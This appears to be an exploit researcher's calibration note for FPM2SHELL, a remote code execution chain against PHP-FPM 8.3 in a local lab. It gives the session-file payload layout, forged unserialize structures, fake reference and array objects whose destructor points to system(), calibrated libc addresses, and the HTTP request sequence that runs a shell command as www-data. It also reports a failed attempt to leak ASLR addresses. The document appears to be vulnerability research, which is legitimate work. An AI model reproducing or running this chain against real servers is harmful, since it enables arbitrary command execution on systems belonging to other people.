# FPM2SHELL — session-value delivery calibration (LOCKED 2026-10-22)

Target: `php:8.3.35-fpm` (vulnerable), nginx `127.0.0.1:18120`, single worker,
`memory_limit=16M`, `post_max_size=64M`, `session.upload_progress.enabled=1`,
`session.serialize_handler=php`, files handler, `save_path=/tmp`.

This module replaces the raw session-file helper with a normal application
session write.  The exploit is then pure HTTP against the app:

```
store.php : session_start(); $_SESSION['p']=$_POST['p'];
            $_SESSION['upload_progress_fk1']=&$_SESSION['p'];
            session_write_close();
index.php : @unserialize($_POST['data']);      // A: app-level OOM fatal
/index.php: multipart PHP_SESSION_UPLOAD_PROGRESS // B: upload-progress decode
```

`store.php` is the only application precondition: the app accepts a binary
value into the session and keeps a reference/alias to it (a very common
shape).  No raw session record is written by the tooling.

## Session file

The encoder writes exactly:

```
p|s:65500:"<payload>";upload_progress_fk1|R:1;
```

* `p` is the 65,500-byte binary value.  `s:` strings are length-prefixed and
  raw, so NUL/binary bytes survive.
* Assigning `$_SESSION['upload_progress_fk1'] = &$_SESSION['p']` turns the `p`
  slot into a reference *before* encoding, so `php_add_var_hash` assigns it
  id 1 and the alias encodes as `R:1;`.
* File length = 11 + 65,500 + 2 + 24 = 65,537 bytes.  `zend_string_alloc`
  requests 65,562 bytes -> 17 pages (same class as the old 65,541-byte
  record).

## Read-buffer geometry

B reads the file into a request `zend_string`:

```
zend_string header : 0x18
header base        : B
data start         : B + 0x18
fake struct at     : file offset 0x1fe8 -> B + 0x2000
```

Measured stale decoder address `D = 0x7f886e26c000`; the allocator gives
`B = D - 0x2000`, so file offset `0x1fe8` lands exactly on `D`
(gdb marker: `d-8168`, `fileoff_if_base=0x1fe8`).

Session prefix `p|s:65500:"` is 11 bytes, so the payload offset is

```
struct_payload_off = 0x1fe8 - 11 = 0x1fdd
```

## Forged `php_unserialize_data` at D

```
D + 0x00 : last                = D + 56          (inline var_entries)
D + 0x08 : first_dtor          = 0
D + 0x10 : last_dtor           = 0
D + 0x38 : entries.used_slots  = 1018
D + 0x40 : entries.next        = 0
D + 0x48 : entries.data[0..1017] = V
```

`used_slots=1018` makes the first `var_push` allocate a fresh
`var_entries` block, so the inline `entries.data[]` array keeps the forged
pointers.  `R:1` -> `id=0` -> `var_access(0)` reads the inline slot 0 = `V`.

## Fake objects (all inside the same payload)

```
V   = D + 0x2100 : zval { value=R, type=0x10A (IS_REFERENCE_EX) }
R   = D + 0x2180 : zend_reference { rc=0, type=10, val={S,0x107},
                                    sources=0 }
S   = D + 0x2200 : zend_array { gc.rc=1, gc.type=7,
                                flags=HASH_FLAG_STATIC_KEYS (0x10),
                                nTableMask=0xFFFFFFF8,
                                arData=CMD, nNumUsed=1,
                                nNumOfElements=0, nTableSize=8,
                                pDestructor=system }
CMD = D + 0x2300 : "id>/tmp/f2s_pwn\0"
```

`R`'s refcount starts at 0; the decoder's `ZVAL_COPY` makes it 1.  At B's
`MULTIPART_EVENT_FILE_START` the progress update replaces the
`upload_progress_fk1` bucket with the real progress array; the hash update
`zval_ptr_dtor`s the decoded reference, `zend_reference_destroy` drops the
array, `zend_array_destroy` -> `zend_hash_destroy` (nNumUsed=1,
pDestructor != ZVAL_PTR_DTOR) calls `pDestructor(&bucket.val)` =
`system(arData)` = `system(CMD)`.

`nNumOfElements=0` keeps the serializer's encode path from walking `arData`
if a flush happens before the replacement.

## Calibrated addresses (this FPM master)

```
D      = 0x7f886e26c000
libc   = 0x7f886f06c000
system = libc + 0x53090 = 0x7f886f0bf090
```

Both are inherited from the FPM master by every forked worker, so they are
stable across worker respawns while the master lives.  A container/master
restart changes them; re-measure `D` with `m3_app.sh`/g11.gdb.

## Request sequence

1. `store.php` (same SID cookie, field `p` = 65,500-byte payload).
   - Verify target file: 65,537 bytes, tail `...";upload_progress_fk1|R:1;`.
2. `index.php` (A): multipart `filler=4,000,000*Q` + `data=a:40000:{...}`
   -> app-level decoder OOM, worker survives, `BG(unserialize)` dangles.
3. No request between A and B (RINIT clears the orphan).
4. `index.php` (B): multipart `PHPSESSID=<sid>`,
   `PHP_SESSION_UPLOAD_PROGRESS=fk1`, empty file part `f`.
   -> pre-RINIT session decode uses the stale decoder, `R:1` resolves to V,
   update replaces the key, dtor chain runs `system`.

## Evidence

* `evidence/m3_app_gdb.out` — gdb: `VARTMP d=0x7f886e26c000`,
  marker `fileoff_if_base=0x1fe8`, `RCDTOR ref=... rc=0 type=10`,
  `SYSTEM rdi=... cmd=id>/tmp/f2s_pwn`, then the expected abort backtrace
  through `zend_array_destroy` / `zend_hash_update`.
* `evidence/m3_app_uid.txt` — `uid=33(www-data) gid=33(www-data) ...`.
* `evidence/m3_app_session.txt` — stored session file size/head/tail.
* `evidence/m3_app_pure.out`, `evidence/m3_app_pure2.out` — no-gdb request
  sequences, same proof.
* 5/5 successful runs (2 with gdb observation, 3 pure HTTP).

## FPM ASLR leak investigation (negative result)

The public 9bie/mod_php chain leaks the heap/libphp base through a pre-RINIT
`php_session_send_cookie()` OOM that leaves `PS(id)` and `PS(send_cookie)=1`
across requests.  On FPM this does not transfer:

* Pre-RINIT OOM (parser/session callback before RINIT) -> FPM child exits
  with code 70, state gone (re-verified: `deepjb` lab, 12.5 MB pad request,
  worker 1549 -> respawn).
* Post-RINIT fatal (app `session_start()` OOM inside `php_url_encode`, or an
  uncaught exception in a user save handler `open()`) keeps the worker alive,
  but the session RSHUTDOWN still runs: after the request
  `PS(id)=0x0`, `PS(send_cookie)=1`.  The dangling id is cleared, so B's
  END-cleanup cannot use it.  Source check: `PHP_RSHUTDOWN_FUNCTION(session)`
  unconditionally calls `php_rshutdown_session_globals()`, which releases
  `PS(id)`, and `php_session_initialize()` sets `PS(session_status)=active`
  before `php_session_reset_id()`, so the flush path runs too.
* `BG(unserialize)` persists (F-09) because the basic module's shutdown is
  skipped, but `PS(id)`/`PS(http_session_vars)` do not persist.

Therefore the FPM chain needs addresses that are either calibrated
(lab/local) or obtained through an application-level info leak; the
mod_php Set-Cookie leak is not portable.  This matches the reference
analysis: FPM paths depend on an application-level trigger, and no complete
pre-RINIT FPM exploit has been demonstrated.

Probe artifacts (lab only): `app/leak_a.php`, `app/leak_x.php`,
`app/leak_probe.php`, `t_pre_oom.py`, `g_ps.gdb`.
